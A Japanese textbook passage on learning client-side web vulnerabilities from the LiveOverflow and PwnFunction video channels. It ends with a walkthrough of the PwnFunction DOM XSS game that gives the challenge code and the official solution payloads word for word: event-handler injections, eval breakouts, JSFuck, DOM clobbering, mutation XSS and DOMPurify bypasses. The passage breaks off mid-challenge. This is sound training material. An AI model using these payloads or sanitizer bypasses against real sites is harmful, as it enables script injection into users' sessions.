# LiveOverflow と PwnFunction で学ぶ：動画チャンネルと公式XSSゲームで手を動かす

> **この節で分かること**
> - クライアントサイド脆弱性の学習に直結する2大YouTubeチャンネル（LiveOverflow と PwnFunction）の性格と、どの動画から観るべきかを説明できる
> - LiveOverflow の `web 0x00`〜`0x05` シリーズやXSS歴史シリーズなど、体系的に辿れる動画の全体像を把握できる
> - PwnFunction 公式の DOM XSS 練習場 `xss.pwnfunction.com` の各チャレンジ（Warmups 8問＋Challenges 6問）を、実際の sink・フィルタ・DOM Clobbering の観点で読み解ける
> - 出力コンテキスト4分類と `htmlspecialchars` の落とし穴（`ENT_QUOTES`）を自分で説明できる
> - 「同一オリジンポリシーは送信ではなく読み取りを止める」という非対称性と、それがCSRFの存在理由であることを説明できる
> - 「混乱した代理人（Confused Deputy）」というモデルで、なぜ「JSが注入できる」だけでは脆弱性ではないのかを説明できる

**元資料**:
- LiveOverflow チャンネル: https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w （原典は取得できず、チャンネル所有者本人が公開する `LiveOverflow/yt_statistics` の全動画メタデータ＋全336本の逐語トランスクリプトを一次情報として使用）
- PwnFunction チャンネル: https://www.youtube.com/c/PwnFunction/videos （原典は取得できず、`all_videos.jsonl` の全動画メタデータ＋公式リポジトリ `PwnFunction/xss.pwnfunction.com` / `PwnFunction/sandbox.pwnfunction.com` を一次情報として使用）

**関連する節**: 同章の後半ユニット（`alert(document.domain)` を使う理由、mutation XSS、DOM Clobbering 総合演習、SOP誕生史など）

---

## 1. なぜ「動画チャンネル」から入るのか

クライアントサイド脆弱性は、ブラウザの内部挙動・HTMLパーサの癖・JavaScriptの評価規則といった「目に見えない仕組み」を理解しないと再現できない。文章だけでは掴みにくいこの領域を、**画面録画とアニメーションで見せてくれる**のが本節で扱う2チャンネルである。

- **LiveOverflow**（チャンネルID `UClcE-kVhqyiHCcjYwcpfj9w`、運営者は独 Fabian Fäßler）は、「答えを教える」より「どう考え、どう調べ、どう失敗したか」を見せる研究プロセス型のチャンネル。
- **PwnFunction**（チャンネルID `UCW6MNdOsqv2E9AjQkv9we7A`、ハンドルは `@PwnFunction`）は、アニメーション主体で1つの脆弱性クラスを短く凝縮して解説する「概念の教科書」型。

読者へのメッセージは単純である。**概念をまず掴むなら PwnFunction、深掘りと研究プロセスを学ぶなら LiveOverflow**、という使い分けが定石だ。両者は交流があり、LiveOverflow の DOM Clobbering 解説や `Pasteurize` 解説が PwnFunction の動画からリンクされるなど、相互補完的でもある。

### 1-1. この節の情報源について（原典が取得できなかった理由）

本教科書の執筆環境では、`www.youtube.com` が組織のegress（外向き通信）ポリシーでプロキシに遮断され、YouTubeページを直接取得できなかった。egressとは、内側のネットワークから外部への通信のこと。ここでは「執筆環境からYouTubeへ出て行く通信がブロックされた」という意味である。

そこで、**推測でタイトルを作るのではなく**、LiveOverflow 本人がGitHubで公開している機械可読データ `LiveOverflow/yt_statistics` を一次情報として用いた。このリポジトリには全動画のメタデータ（`liveoverflow_videos.jsonl`、全336本）に加え、**各動画の逐語トランスクリプト（字幕本文）** が `liveoverflow_transcripts/<video_id>.txt` として同梱されている。取得コマンドと注意点は次のとおり。

```bash
git clone --depth 1 https://github.com/LiveOverflow/yt_statistics
cd yt_statistics
# タイトルで動画IDを探す
python3 -c "
import json
for l in open('liveoverflow_videos.jsonl'):
    v=json.loads(l)
    if 'XSS' in v['title']: print(v['video_id'], v['date'][:10], v['title'])
"
# 本文を読む
less liveoverflow_transcripts/lG7U3fuNw3A.txt
# 全トランスクリプト横断grep（例: DOM Clobbering に言及する動画を探す）
grep -ril "clobber" liveoverflow_transcripts/
```

READMEには利用許諾も明記されている（逐語）。

```text
Feel free to use the data to create some statistics, or train a LiveOverflow script writing AI (but pls let me use it too :P)
```

データの取得日はREADMEに `Data was last pulled on 15.03.2023.` とある。つまり**再生数などの数値は2023年3月時点**であり、それ以降の新作動画はこのデータに含まれない。またトランスクリプトは音声のみで、**画面録画で示されるコード・DOMツリー・デベロッパーツールの画面は文字になっていない**。`this` `here` `look at this` といった指示語が多いので、細部まで理解したい回は必ず動画を観ること。

PwnFunction 側は `all_videos.jsonl` に全20本のメタデータ（タイトル・投稿日・再生数・いいね・コメント・タグ）が含まれるが、**説明文やトランスクリプトは含まれない**。動画本文は読者自身がYouTubeの「文字起こしを表示」または `yt-dlp --write-auto-sub` で取得すること。

> ### 📌 ここは自分で開いて読んでください
> **資料**: LiveOverflow チャンネル — https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w （または `@LiveOverflow`）
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の制限＝egressポリシーでYouTubeがプロキシに遮断された）。以下の記述は、チャンネル所有者本人が公開する動画メタデータと逐語トランスクリプトにもとづく要約である。映像・画面録画そのものは未取得。
> **読みどころ**:
> 1. 再生リスト「Web Hacking / web 0xNN」を通しで視聴（`web 0x00`〜`0x05`）— HTML/HTTP/PHP/XSSコンテキスト/CSRF/SOP/Confused Deputy の基礎を順に。
> 2. 再生リスト「The History of XSS」— SOP誕生（1995）〜Universal XSS〜XSS語源。クライアントサイド脆弱性の「なぜ」を歴史から理解する。
> 3. 単発の名作: `XSS on Google Search - Sanitizing HTML in The Client?`（lG7U3fuNw3A）、`DO NOT USE alert(1) for XSS`（KHwVjzWei1c）、`Fuzzing Browsers for weird XSS Vectors`（yq_P3dzGiK4）、`Missing HTTP Security Headers`（064yDG7Rz80）。
> 4. 研究プロセスの学び方: `How did Masato find the Google Search XSS?`、`Failed DOM Clobbering Research` で「失敗を含む思考過程」を観察する。
> **代替手段**: 上記 `git clone https://github.com/LiveOverflow/yt_statistics` の逐語トランスクリプト（本人が利用許諾済み）。ただし2023-03-15時点までで、映像は含まれない。

> ### 📌 ここは自分で開いて読んでください
> **資料**: PwnFunction チャンネル — https://www.youtube.com/c/PwnFunction/videos （または `@PwnFunction`）
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の制限＝egressポリシーでYouTubeがプロキシに遮断された）。以下は動画メタデータと公式GitHubリポジトリにもとづく要約であり、動画本文（説明・トランスクリプト）は入手できていない。
> **読みどころ**:
> 1. 脆弱性クラス「Explained」動画を最初に観る（後掲の一覧参照）。1本ずつが短く、クラス学習に最適。
> 2. DOM Clobbering 入門の定番 `Solving a Hard Google CTF challenge - "Paste-tastic!"`（2up8J9dErHI）、特に `?t=797`（13分17秒）以降。
> 3. 手を動かす: 公式DOM XSSゲーム `https://xss.pwnfunction.com/`（Warmups 8＋Challenges 6）。本節の第3章で全チャレンジを解説する。
> **代替手段**: ゲームのソースは GitHub `PwnFunction/xss.pwnfunction.com`（公式解説）と `PwnFunction/sandbox.pwnfunction.com`（実チャレンジHTML）で読める。動画本文の代替は `yt-dlp --write-auto-sub` で各自取得。

---

## 2. LiveOverflow の全体像

### 2-1. シリーズ命名規則

LiveOverflow の動画は連番シリーズで構成され、初心者が体系的に辿れる。付随リポジトリ `LiveOverflow/liveoverflow_youtube`（"Material for the YouTube series"、521★）に各動画のコード・素材が置かれている。

```text
bin 0x00〜      : バイナリexploitation/リバースエンジニアリング入門（メモリ破壊・ROP・シェルコード等）
web 0x00〜0x05  : Webセキュリティ入門（本節の主対象）
browser 0x00〜  : ブラウザexploitation（JavaScriptCore/WebKitのJITバグからのメモリ破壊）
ミニシリーズ    : 「XSS with AngularJS 0x0〜0x4」「The History of XSS」等
```

編集方針の特徴は、「答えを教える」より「どう考え、どう調べ、どう失敗したか」を見せることにある。実際 `Failed DOM Clobbering Research`（失敗研究）や `How did Masato find the Google Search XSS?`（研究プロセスの追体験）といったタイトルが並ぶ。`yt_statistics` のメタデータは次の形式で公開されている（逐語、README より）。

```json
{
    "channel_id": "UClcE-kVhqyiHCcjYwcpfj9w",
    "video_id": "MS7WRuzNYDc",
    "thumbnail": "https://i.ytimg.com/vi/MS7WRuzNYDc/hqdefault.jpg",
    "date": "2022-10-21T15:55:18Z",
    "views": "260530",
    "tags": ["ip address", "leak", "..."],
    "title": "I Leaked My IP Address!",
    "description": "How bad is it to leak your IP address? VPN providers..."
}
```

各動画のURLは `https://www.youtube.com/watch?v=<video_id>` で開ける。以下の表の `video_id` 列をこのURLの末尾に付ければよい。

### 2-2. web 0x0N 入門シリーズ（クライアントサイドの土台）

Webセキュリティに入る前のHTML/HTTP/PHPから始まり、XSSコンテキスト・CSRF・SOP・Confused Deputy へと積み上がる。**まずここから観る**のが王道である。再生数は2023年3月時点。

| タイトル | 投稿日 | 再生数 | video_id | 要点 |
| --- | --- | --- | --- | --- |
| HTML + CSS + JavaScript introduction - web 0x00 | 2016-08-19 | 134,521 | jmgsgjPn1vs | セキュリティ前提のWeb開発超速入門 |
| The HTTP Protocol: GET /test.html - web 0x01 | 2016-08-23 | 86,989 | C_gZb-rNcVQ | HTTP GETを手で送りサーバ動作を学ぶ |
| What is PHP and why is XSS so common there? - web 0x02 | 2016-08-30 | 131,770 | Q2mGcbkX550 | 単純なPHPアプリでXSSが頻発する理由 |
| XSS Contexts and some Chrome XSS Auditor tricks - web 0x03 | 2016-09-13 | 78,260 | 8GwVBpTgR2c | XSSの「コンテキスト」とAuditor回避 |
| CSRF Introduction and what is the Same-Origin Policy? - web 0x04 | 2016-09-23 | 113,701 | KaEj_qZgiKY | CSRFとSame-Origin Policyの関係 |
| The Browser is a very Confused Deputy - web 0x05 | 2016-11-01 | 37,852 | Yfsmc0b8o78 | Norm Hardy の名論文を読みXSS/CSRFと接続 |

これらのうち `web 0x03`・`0x04`・`0x05` の中身は、本節の第5〜7章で逐語トランスクリプトをもとに深掘りする。

### 2-3. AngularJS サンドボックス脱出 XSS ミニシリーズ

クライアントサイドテンプレートインジェクション（Client-Side Template Injection, CSTI）の実例。CSTIとは、クライアント側で動くテンプレートエンジンに攻撃者の式を評価させる脆弱性のこと。歴史的だが「サンドボックスの発想と破り方」を学ぶ教材として有用。サンドボックスとは、危険なコードを隔離して害を及ぼさせないための仕組みのこと。

| タイトル | 投稿日 | video_id | 要点 |
| --- | --- | --- | --- |
| Introducing the AngularJS Javascript Framework - XSS with AngularJS 0x00 | 2016-09-02 | 67Yc8_Bszlk | AngularJS `{{expressions}}` 入門 |
| Sandbox Bypass in Version 1.0.8 - XSS with AngularJS 0x1 | 2016-09-06 | DkL3jaI1cj0 | v1.0.8のサンドボックスを破ってXSS（参考: Mario Heiderich, Gareth Heyes, PortSwigger "XSS without HTML"） |
| Previous Bypass is now fixed in version 1.4.7 - XSS with AngularJS 0x2 | 2016-09-16 | 6pGEVDderN4 | v1.4.7で旧回避が修正済みと確認 |
| New Sandbox Bypass in 1.4.7 - XSS with AngularJS 0x3 | 2016-09-20 | Hium4FVAR5A | Gareth Heyes によるv1.4.7回避 |
| Sandbox bypass for the latest AngularJS version 1.5.8 - XSS with AngularJS 0x4 | 2016-10-14 | JFIGpRh76XY | v1.5.7の不完全修正を突く |

### 2-4. XSS研究・DOM/ブラウザパーサ系（クライアントサイドの核心）

XSSの実戦研究、URLパースの罠、ブラウザパーサの非直感性など、バグバウンティで最も役立つ回が並ぶ。

| タイトル | 投稿日 | 再生数 | video_id | 要点 |
| --- | --- | --- | --- | --- |
| The Curse of Cross-Origin Stylesheets - Web Security Research | 2018-09-28 | 97,773 | bMPAXsgWNAc | クロスオリジンCSSの過去バグを辿り研究の進め方を示す |
| HOW FRCKN' HARD IS IT TO UNDERSTAND A URL?! - uXSS CVE-2018-6128 | 2018-10-19 | 339,141 | 0uejy9aCNbI | URLパースの難しさ（uXSS）。関連: Orange Tsai "A New Era of SSRF" |
| End-to-End Encryption in the Browser Impossible? - ProtonMail | 2018-11-23 | 90,391 | DM1tPmxGY7Y | ブラウザ内E2EEの限界 |
| XS-Search abusing the Chrome XSS Auditor - filemanager 35c3ctf | 2019-01-21 | 105,470 | HcrQy0C-hEA | XSS AuditorをXS-Searchに悪用 |
| XSS on Google Search - Sanitizing HTML in The Client? | 2019-03-31 | 675,872 | lG7U3fuNw3A | Masato Kinugawa による google.com 上の実XSS |
| How did Masato find the Google Search XSS? | 2019-04-07 | 156,963 | gVrdE6g_fa8 | XSS研究の思考過程を追う |
| Fuzzing Browsers for weird XSS Vectors | 2019-04-14 | 67,016 | yq_P3dzGiK4 | 奇妙なパースで生じるXSSベクタとfuzzing |
| Script Gadgets! Google Docs XSS Vulnerability Walkthrough | 2020-07-31 | 136,483 | aCexqB9qi70 | gDocsスプレッドシートのXSS |
| XSS a Paste Service - Pasteurize (web) Google CTF 2020 | 2020-09-09 | 59,931 | Tw7ucd2lKBk | ペーストサービスへのXSS（易） |
| XSS on the Wrong Domain T_T - Tech Support (web) Google CTF 2020 | 2020-09-18 | 49,714 | 9ecv6ILXrZo | XSSはあるが「違うドメイン」で発火する問題 |
| Failed DOM Clobbering Research - All The Little Things 1/2 | 2020-09-28 | 27,691 | dZXaQKEE3A8 | DOM Clobbering研究の初期リコン（失敗過程含む） |
| Chaining Script Gadgets to Full XSS - All The Little Things 2/2 | 2020-10-08 | 25,802 | UGtrpXk6QVU | 限定的なscript gadgetを連鎖させ完全XSSへ |
| DO NOT USE alert(1) for XSS | 2021-07-31 | 140,268 | KHwVjzWei1c | `alert(document.domain)` を使うべき理由 |
| can you hack this screenshot service?? - CSCG 2021 | 2021-08-19 | 145,204 | FCjMoPpOPYI | 自作Web課題（素材: LiveOverflow/ctf-screenshotter） |
| Authorization vs. Authentication (Google Bug Bounty) | 2021-12-02 | 42,480 | hmJKUQlcGAc | 認可と認証の違い（GoogleVRP委託動画） |
| Missing HTTP Security Headers - Bug Bounty Tips | 2022-03-16 | 115,843 | 064yDG7Rz80 | HTTPセキュリティヘッダの効果と深刻度 |

### 2-5. XSSの歴史シリーズ／ブラウザexploitation／その他

「なぜクライアントサイド脆弱性が存在するのか」を歴史から理解したいなら "The History of XSS" 4部作を、レンダラ/JSエンジンのメモリ破壊という「その先」を学びたいなら `browser 0xNN` を観る。

| タイトル | 投稿日 | video_id | 分類 |
| --- | --- | --- | --- |
| The Same Origin Policy - Hacker History | 2022-07-23 | bSJm8-zJTzQ | 歴史（1995 NetscapeでSOP成立） |
| The Three JavaScript Hacking Legends | 2022-09-04 | VtcA58555lY | 歴史（1997最初期JS脆弱性） |
| The Age of Universal XSS | 2022-09-23 | gVblb-QhZa4 | 歴史（1996-2000 Universal XSS） |
| The Origin of Cross-Site Scripting (XSS) - Hacker Etymology | 2022-10-03 | mKAWpFdVcPY | 歴史（XSSの語源） |
| New Series: Getting Into Browser Exploitation - browser 0x00 | 2019-05-19 | 5tEdSoZ3mmE | ブラウザexploit入門 |
| Hacking Browsers - Setup and Debug JavaScriptCore / WebKit | 2019-05-26 | yJewXMwj38s | 環境構築 |
| The Butterfly of JSObject | 2019-06-02 | KVpHouVMTgY | JSObject内部構造 |
| Just-in-time Compiler in JavaScriptCore (WebKit) | 2019-06-09 | 45wMEIIPsPA | JIT |
| WebKit RegExp Exploit addrof() walk-through | 2019-06-16 | IjyDsVOIx8Y | `addrof()` プリミティブ |
| The fakeobj() Primitive: Turning an Address Leak into a Memory Corruption | 2019-06-23 | vwlG2l0ANuc | `fakeobj()` プリミティブ |
| Revisiting JavaScriptCore Internals: boxed vs. unboxed | 2019-06-30 | dhaLk-XO890 | 値表現 |
| Preparing for Stage 2 of a WebKit exploit | 2019-07-14 | 3c6nC0wdU-Q | exploit準備 |

〔補足〕`browser 0xNN` シリーズは `liveoverflow_videos.jsonl`（2023-03-15取得）上では上記の `Preparing for Stage 2` で一旦途切れている。ネット上でしばしば言及される「Arbitrary Read and Write in WebKit Exploit（2019-07-21）」というタイトルの動画は**このデータには存在しない**ため、本節では確定情報として扱わない。動画が非公開化された可能性・別タイトルで続いた可能性の双方が残るので、続きはYouTubeのチャンネルページで各自確認してほしい。参考として本人が挙げる資料（逐語）は saelo の phrack 論文 `http://www.phrack.org/papers/attacking_javascript_engines.html` と niklasb の exploit `https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html`。

クライアントサイドで有用な単発回もある。`Reverse Engineering Obfuscated JavaScript`（8UqHCrGdxOM、難読化JSの読み方）、`Solving a JavaScript crackme: JS SAFE 2.0`（8yWUaqEcXr4、アンチデバッグ回避）、`What is a Browser Security Sandbox?! (Learn to Hack Firefox)`（StQ_6juJlZY、サンドボックスとは何か）など。全336本中、Web/クライアントサイド関連は約55本である。

---

## 3. PwnFunction の全体像と公式 DOM XSS ゲーム

### 3-1. チャンネルの性格と動画一覧

PwnFunction はアニメーション主体で1つの脆弱性クラスを短く洗練して解説する。**「XSSとは」「CSRFとは」を最初に掴む**のに最適で、LiveOverflow が「深掘り・研究過程」型なのに対し、こちらは「概念の教科書」型である。データ取得時点で20本と少数精鋭。クライアントサイド学習に直結する動画を優先度順に挙げる。

| 優先 | タイトル | 投稿日 | 再生数 | video_id | 学べること |
| --- | --- | --- | --- | --- | --- |
| 1 | Cross-Site Scripting (XSS) Explained | 2020-03-22 | 370,945 | EoaDgUgS6QA | XSSの基礎概念 |
| 2 | Cross-Site Request Forgery (CSRF) Explained | 2019-04-05 | 346,469 | eWEgUcHPle0 | CSRFとSOP |
| 3 | Insecure Direct Object Reference (IDOR) Explained | 2019-02-12 | 89,453 | rloqMGcPMkI | IDOR |
| 4 | Open Redirect Vulnerability Explained | 2019-01-20 | 129,920 | 4Jk_I-cw4WE | オープンリダイレクト（タグにssrf/xss/phishing） |
| 5 | HTTP Parameter Pollution Explained | 2019-01-28 | 234,568 | QVZBl8yxVX0 | HTTPパラメータ汚染 |
| 6 | Hacking Electron Applications | 2019-02-03 | 90,394 | jkJWA_CWrQs | Web技術デスクトップアプリのRCE |
| 7 | Solving a Hard Google CTF challenge - "Paste-tastic!" | 2019-09-03 | 89,707 | 2up8J9dErHI | **DOM Clobbering解説の定番** |
| 8 | When You Use One Wrong Javascript Module | 2021-12-13 | 174,908 | XS_UMqQalLI | Prototype Pollution（npmモジュール由来） |
| 9 | Server-Side Template Injections Explained | 2020-11-27 | 77,753 | SN6EVIG4c-0 | SSTI |
| 10 | Insecure Deserialization Attack Explained | 2021-01-24 | 91,731 | jwzeJU_62IQ | 安全でないデシリアライゼーション |

このほか `XML External Entities (XXE) Explained`（gjm6VHZa_8s）、`How To Predict Random Numbers Generated By A Computer`（-h_rj2-HP2E、`Math.random` 予測）などがある。

### 3-2. 公式 DOM XSS ゲーム `xss.pwnfunction.com` の全体像

PwnFunction が2019年末〜2020年に公開したブラウザXSS練習場。**手を動かして DOM XSS を学ぶ**のに最適で、`innerHTML`・`eval`・`document.write`・jQuery `html()`・DOMPurify・Bootstrap sanitizer など、実際の sink（危険な出力先）とフィルタと DOM Clobbering を体験できる。sink とは、攻撃者のデータが最終的に流れ込んで危険な動作を起こす関数やプロパティのこと。たとえば `element.innerHTML = ユーザ入力` の `innerHTML` が典型的な sink である。

全チャレンジ共通ルール（逐語、各チャレンジHTMLより）。

```text
Difficulty is <Easy|Medium|Hard>.
Pop an alert(1337) on sandbox.pwnfunction.com.
No user interaction.
Cannot use https://sandbox.pwnfunction.com/?html=&js=&css=.
Tested on Chrome.
```

「無操作（No user interaction）で `alert(1337)` を出す」のが目標である点に注意。クリックやフォーカスをユーザにさせてはいけないので、`autofocus`・`onload`・`onerror`・`setTimeout` など**自動発火する仕掛け**を探すことになる。

```text
Warmups（Easy 8問）           Challenges（Medium/Hard 6問）
├─ Ma Spaghet!               ├─ Area 51        (Easy)
├─ Jefff                     ├─ Keanu          (Medium)
├─ Ugandan Knuckles          ├─ WW3            (Hard)
├─ Ricardo Milos             ├─ Jason Bourne   (Medium)
├─ Ah That's Hawt            ├─ Me and the Bois(Medium)
├─ Ligma                     └─ Ded            (Medium)
├─ Mafia
└─ Ok, Boomer
```

> ⚠ 原文注記: このリポジトリは非メンテで、Challenges は現在では新バイパスがあり容易に解ける、と原文が明記している。

以下、各問の課題コードと公式解を逐語で示す。読者はまず自分で解いてから答えを見ること。

### 3-3. Warmup: Ma Spaghet!（sink=innerHTML）

GETパラメータ `somebody` が無加工で `innerHTML` に入る、最も基本的なDOM XSS。

```html
<!-- Challenge -->
<h2 id="spaghet"></h2>
<script>
    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
</script>
```

公式解（逐語）。`<img>` の `onerror` は使えるが、ここでは `<svg onload>` が定番。

```markup
<svg onload=alert(1337)>
```

### 3-4. Warmup: Jefff（sink=eval、文字列ブレイクアウト）

`jeff` が `eval` の中の文字列リテラルに入るので、二重引用符で文字列を抜けてコード実行する。

```html
<!-- Challenge -->
<h2 id="maname"></h2>
<script>
    let jeff = (new URL(location).searchParams.get('jeff') || "JEFFF")
    let ma = ""
    eval(`ma = "Ma name ${jeff}"`)
    setTimeout(_ => {
        maname.innerText = ma
    }, 1000)
</script>
```

公式解（逐語）。前後の `-` で式として評価させ、間に `alert` を挟む。

```js
"-alert(1337)-"
```

### 3-5. Warmup: Ugandan Knuckles（属性ブレイクアウト、`<>`除去）

`<` `>` が除去され新タグは作れないが、引用符は残るので `placeholder` 属性を抜け、`onfocus`＋`autofocus` で無操作発火する。

```html
<!-- Challenge -->
<div id="uganda"></div>
<script>
    let wey = (new URL(location).searchParams.get('wey') || "do you know da wey?");
    wey = wey.replace(/[<>]/g, '')
    uganda.innerHTML = `<input type="text" placeholder="${wey}" class="form-control">`
</script>
```

公式解（逐語）。

```js
"onfocus=alert(1337) autofocus="
```

### 3-6. Warmup: Ricardo Milos（sink=form.action、javascript: URI）

`form.action` にユーザ入力が入り、フォームが自動送信される。`javascript:` URIで実行する。

```html
<!-- Challenge -->
<form id="ricardo" method="GET">
    <input name="milos" type="text" class="form-control" placeholder="True" value="True">
</form>
<script>
    ricardo.action = (new URL(location).searchParams.get('ricardo') || '#')
    setTimeout(_ => {
        ricardo.submit()
    }, 2000)
</script>
```

公式解（逐語）。

```js
javascript:alert(1337)
```

### 3-7. Warmup: Ah That's Hawt（HTMLエンティティで括弧フィルタ回避）

`()` とバッククォート・バックスラッシュが除去されるため `alert(1337)` を直接書けない。しかし**属性値はHTMLエンティティエンコード可能**なので、ペイロードをエンティティ化する。HTMLエンティティとは、`&#x28;` のように文字を符号で表す書き方のこと。ブラウザは属性値を読むときにこれを元の文字（この例では `(`）に戻すので、フィルタをすり抜けられる。

```html
<!-- Challenge -->
<h2 id="will"></h2>
<script>
    smith = (new URL(location).searchParams.get('markassbrownlee') || "Ah That's Hawt")
    smith = smith.replace(/[\(\`\)\\]/g, '')
    will.innerHTML = smith
</script>
```

公式解（逐語）。`&` などURL非安全文字はURLエンコードも併用する。

```markup
<!-- URL Encoding + HTML Entity Encoding -->
%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E

<!-- HTML Entity Encoding -->
<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">

<!-- No Encoding -->
<svg onload="alert(1337)">
```

### 3-8. Warmup: Ligma（英数字全除去→JSFuck）

`eval` に入るが英数字が全て空文字に置換される。そこで **JSFuck** でペイロードを非英数字のみのJSに変換する。JSFuck とは、`[]()!+` の6文字だけでチューリング完全なJavaScriptを書ける難読化手法のこと（`jsfuck.com`）。英数字除去フィルタの典型的回避策である。

```html
<script>
    balls = (new URL(location).searchParams.get('balls') || "Ninja has Ligma")
    balls = balls.replace(/[A-Za-z0-9]/g, '')
    eval(balls)
</script>
```

公式解の短縮版（逐語）。

```js
/* Shorter */
ᵥ=[];ᵤ=-~ᵥ;ᵞ=-~-~ᵤ;ᵠ=ᵥ+{};ᵨ=-~-~ᵞ;ᵅ=ᵠ[ᵨ];ᵈ=ᵠ[ᵤ];ᵡ=!!ᵥ+ᵥ;ᵜ=ᵡ[ᵤ+~ᵥ];ᵝ=ᵡ[ᵤ];ᵢ=!ᵥ+ᵥ;ᵣ=ᵥ[~ᵥ]+ᵥ;ᵥ[_=ᵅ+ᵈ+ᵣ[ᵤ]+ᵢ[ᵞ]+ᵜ+ᵝ+ᵣ[ᵤ+~ᵥ]+ᵅ+ᵜ+ᵈ+ᵝ][_](ᵢ[ᵤ]+ᵢ[-~ᵤ]+ᵢ[-~ᵞ]+ᵝ+ᵜ+`(${ᵤ+''+ᵞ+ᵞ+-~-~ᵨ})`)()
```

### 3-9. Warmup: Mafia（複数フィルタ＋eval、Function/hash利用）

長さ50に切り詰め、``` ` ``` `'"+-!\[]` をアンダースコア化、文字列 `alert` もアンダースコア化される。禁止された文字と `alert` を使わずにコードを組み立てる問題。

```js
/* Challenge */
mafia = (new URL(location).searchParams.get('mafia') || '1+1')
mafia = mafia.slice(0, 50)
mafia = mafia.replace(/[\`\'\"\+\-\!\\\[\]]/gi, '_')
mafia = mafia.replace(/alert/g, '_')
eval(mafia)
```

公式解の3案（逐語）。正規表現の `.source` と `.toLowerCase()` で `alert` の文字列を組み立てる案、数値を30進で文字列化する案、URLの `#`（location.hash）から読み込む案。

```js
Function(/ALERT(1337)/.source.toLowerCase())()
```
```js
eval(8680439..toString(30))(1337)
```
```js
eval(location.hash.slice(1))
```

最後の案はURLに `#alert(1337)` を付ける（原文注記: Thanks to @terjanq）。

### 3-10. Warmup: Ok, Boomer（DOMPurify＋setTimeout、DOM Clobbering）

ここから **DOM Clobbering** が登場する。DOM Clobbering とは、HTML要素に `id` や `name` を付けると同名のJavaScript変数（グローバル／`document` のプロパティ）が自動生成される仕様を悪用し、**スクリプトを注入せずにJSの変数を上書き・作成する**手法のこと。DOMPurify という強力なサニタイザで `<script>` 等が消されても、この手が残ることがある。

```html
<!-- Challenge -->
<h2 id="boomer">Ok, Boomer.</h2>
<script>
    boomer.innerHTML = DOMPurify.sanitize(new URL(location).searchParams.get('boomer') || "Ok, Boomer")
    setTimeout(ok, 2000)
</script>
```

`innerHTML` はDOMPurifyでサニタイズされるが、直後の `setTimeout(ok, 2000)` の `ok` が未定義である。そこで `id=ok` のアンカータグを作ると同名JS変数が生成され、`toString()` で `href` の値を返す。`setTimeout` は第1引数が関数でない場合その `toString()` を呼び、返った文字列をコードとして実行する。公式解（逐語）。

```markup
<a id=ok href=tel:alert(1337)>
```

原文の注記（逐語の要点）: `href` は任意文字列不可で、`protocol:host` 形式でないと値が `BaseURL/yourString` になってしまう。`tel:alert(1337)` は `label:code` 構文として妥当なJavaScriptでもあり、しかも `tel` はDOMPurifyの許可プロトコル（`cure53/DOMPurify` の `src/regexp.js` にホワイトリスト）なので通る。

### 3-11. Challenge: Area 51（Easy、HTMLコメントのmutation）

`debug` はHTMLコメント内に入って `innerHTML` で挿入される。`!-/#&;%` は除去されるが、ブラウザが `<php>` を `<!--php-->` に mutate（変形）する挙動を突く。mutation XSS とは、ブラウザがパース時にHTMLを勝手に書き換えることで、サニタイズ後に危険な形へ変わってしまう脆弱性のこと。

```html
<!-- Challenge -->
<div id="pwnme"></div>
<script>
    var input = (new URL(location).searchParams.get('debug') || '').replace(/[\!\-\/\#\&\;\%]/g, '_');
    var template = document.createElement('template');
    template.innerHTML = input;
    pwnme.innerHTML = "<!-- <p> DEBUG: " + template.outerHTML + " </p> -->";
</script>
```

公式解 Intended（逐語）。`<php>`（`<?>` は `<php>` の短縮形）が生成する新コメントが既存コメント内にネストし、HTMLにネストコメントの概念が無いため既存コメントを破壊してJS実行に至る。

```markup
<?php><svg onload=alert(1337)>

<!-- Also works because, <?> is short for <php> -->
<?><svg onload=alert(1337)>
```

公式解 Unintended（@terjanq、後に修正、逐語）。HTMLエンティティ `&#;` のブロック漏れを突いたもの。

```markup
<svg><b title="&#x2D;&#x2D;&#x3E;&#x3C;&#x73;&#x76;&#x67;&#x2F;&#x6F;&#x6E;&#x6C;&#x6F;&#x61;&#x64;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x29;&#x3E;">aaa
```

### 3-12. Challenge: Keanu（Medium、Bootstrap Popover＋eval）

`number` は1文字制限だが、Bootstrap Popover の `data-container` を使って `number` 要素内にコンテンツを注入し、`eval` に渡る値を伸ばす。

```html
<number id="number" style="display:none"></number>
<div class="alert alert-primary" role="alert" id="welcome"></div>
<button id="keanu" class="btn btn-primary btn-sm" data-toggle="popover" data-content="DM @PwnFunction"
    data-trigger="hover" onclick="alert(`If you solved it, DM me @PwnFunction :)`)">Solved it?</button>

<script>
    /* Input */
    var number = (new URL(location).searchParams.get('number') || "7")[0],
        name = DOMPurify.sanitize(new URL(location).searchParams.get('name'), { SAFE_FOR_JQUERY: true });
    $('number#number').html(number);
    document.getElementById('welcome').innerHTML = (`Welcome <b>${name || "Mr. Wick"}!</b>`);

    /* Greet */
    $('#keanu').popover('show')
    setTimeout(_ => {
        $('#keanu').popover('hide')
    }, 2000)

    /* Check Magic Number */
    var magicNumber = Math.floor(Math.random() * 10);
    var number = eval($('number#number').html());
    if (magicNumber === number) {
        alert("You're Breathtaking!")
    }
</script>
```

公式解 Intended（逐語ペイロード）。既存の `#keanu` より先にpopoverを発火させるため `id=keanu` を付ける。

```markup
number='
name=<button data-toggle=popover data-container=number id=keanu data-content="'-alert(1337)//">
```

公式解 Unintended（@Int3rN3t3r、jQuery向けDOMPurifyバイパス by Masato Kinugawa、逐語）。

```markup
name=<img x="/><img src=x onerror=alert(1337)>" y="<x">
```

### 3-13. Challenge: WW3（Hard、jQuery html()のhtmlPrefilter＋DOM Clobbering）

この問題の核心は、**`innerHTML` のサニタイズと jQuery `html()` のサニタイズは同じではない**という誤った前提を突くことである。jQueryは内部で `innerHTML` を使う前に細工をする。中核部（逐語）。

```js
/* Utils */
